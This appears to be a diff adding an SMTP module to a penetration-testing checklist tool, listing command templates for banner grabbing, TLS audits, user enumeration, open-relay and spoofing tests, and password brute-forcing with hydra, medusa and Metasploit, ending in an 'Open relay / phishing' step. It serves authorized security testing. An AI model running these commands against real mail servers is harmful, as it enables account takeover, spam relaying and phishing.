@@ -1,0 +1,141 @@
+module: smtp
+name: SMTP (25 / 587 / 465)
+inputs: [DOMAIN, USERS, OUT]
+
+# 25 = plaintext/STARTTLS, 587 = submission (STARTTLS), 465 = implicit TLS (SMTPS).
+# TLS steps here are NOT tls_only: STARTTLS applies on 25/587, implicit on 465,
+# so command variants cover both rather than gating the whole section off.
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / version
+        commands: |
+          nmap -p$PORT -sV $IP
+      - id: banner
+        text: Banner grab
+        commands: |
+          nc -nv $IP $PORT
+          telnet $IP $PORT
+      - id: ehlo
+        text: EHLO / list advertised capabilities
+        commands: |
+          (printf 'EHLO attacker.com\r\nQUIT\r\n'; sleep 2) | nc -nv $IP $PORT
+          nmap -p$PORT --script=smtp-commands $IP
+
+  - id: fingerprint
+    name: Fingerprinting & Identification
+    steps:
+      - id: software_id
+        text: Identify MTA software / version
+        commands: |
+          nmap -p$PORT -sV --script=smtp-commands $IP
+          msfconsole -qx "use auxiliary/scanner/smtp/smtp_version; set RHOSTS $IP; set RPORT $PORT; run; exit"
+      - id: ntlm_info
+        text: NTLM info leak (AUTH NTLM)
+        commands: |
+          nmap -p$PORT --script=smtp-ntlm-info $IP
+
+  - id: tls
+    name: TLS / STARTTLS
+    steps:
+      - id: starttls_connect
+        text: Connect via STARTTLS (25/587) or implicit TLS (465)
+        commands: |
+          openssl s_client -starttls smtp -crlf -connect $IP:$PORT
+          openssl s_client -crlf -connect $IP:465
+      - id: tls_audit
+        text: TLS audit / cipher enumeration
+        commands: |
+          testssl.sh --starttls smtp $IP:$PORT
+          nmap -p$PORT --script=ssl-enum-ciphers --script-args tls.starttls=smtp $IP
+      - id: cert_san
+        text: Certificate details / SAN harvest
+        commands: |
+          openssl s_client -starttls smtp -connect $IP:$PORT </dev/null 2>/dev/null | openssl x509 -noout -text
+          echo | openssl s_client -connect $IP:465 2>/dev/null | openssl x509 -noout -ext subjectAltName
+
+  - id: user_enum
+    name: User Enumeration
+    steps:
+      - id: vrfy
+        text: User enumeration via VRFY
+        commands: |
+          smtp-user-enum -M VRFY -U $USERLIST -t $IP
+          (printf 'VRFY root\r\nQUIT\r\n'; sleep 1) | nc -nv $IP $PORT
+      - id: expn
+        text: User enumeration via EXPN
+        commands: |
+          smtp-user-enum -M EXPN -U $USERLIST -t $IP
+      - id: rcpt
+        text: User enumeration via RCPT TO
+        commands: |
+          smtp-user-enum -M RCPT -D $DOMAIN -U $USERLIST -t $IP
+      - id: nmap_enum
+        text: User enumeration via nmap / msf
+        commands: |
+          nmap -p$PORT --script=smtp-enum-users $IP
+          msfconsole -qx "use auxiliary/scanner/smtp/smtp_enum; set RHOSTS $IP; set RPORT $PORT; set USER_FILE $USERLIST; run; exit"
+
+  - id: relay
+    name: Open Relay & Abuse
+    steps:
+      - id: open_relay
+        text: Open relay test
+        commands: |
+          nmap -p$PORT --script=smtp-open-relay $IP
+          swaks --to test@external.com --from attacker@evil.com --server $IP:$PORT
+      - id: manual_relay
+        text: Manual relay verification
+        manual: true
+        commands: |
+          # telnet: MAIL FROM/RCPT TO to an external domain; 250 on both = relay
+      - id: spoof
+        text: Sender spoofing / DSN info leak
+        manual: true
+        commands: |
+          swaks --to victim@$DOMAIN --from spoofed@$DOMAIN --server $IP:$PORT --header "Subject: test"
+
+  - id: vuln
+    name: Vulnerability Identification (fingerprint-driven)
+    steps:
+      - id: cve_map
+        text: Version to CVE mapping
+        commands: |
+          searchsploit <mta> <version>
+      - id: script_vuln
+        text: Script-based vuln checks
+        commands: |
+          nmap -p$PORT --script=smtp-vuln* $IP
+
+  - id: creds
+    name: Default & Weak Credentials
+    authorized: true
+    steps:
+      - id: brute
+        text: Auth brute-force (submission)
+        commands: |
+          hydra -L $USERLIST -P $PASSLIST smtp://$IP:$PORT
+          medusa -h $IP -U $USERLIST -P $PASSLIST -M smtp -n $PORT
+      - id: brute_msf
+        text: Brute-force via Metasploit
+        commands: |
+          msfconsole -qx "use auxiliary/scanner/smtp/smtp_login; set RHOSTS $IP; set RPORT $PORT; set USER_FILE $USERLIST; set PASS_FILE $PASSLIST; run; exit"
+
+  - id: exploit
+    name: Exploitation
+    authorized: true
+    steps:
+      - id: userenum
+        text: "User enumeration"
+        commands: |
+          smtp-user-enum -M RCPT -U $USERLIST -D $DOMAIN -t $IP
+          nmap -p$PORT --script smtp-enum-users $IP
+      - id: relay
+        text: "Open relay / phishing"
+        commands: |
+          nmap -p$PORT --script smtp-open-relay $IP
+          swaks --to victim@$DOMAIN --from x@$DOMAIN --server $IP
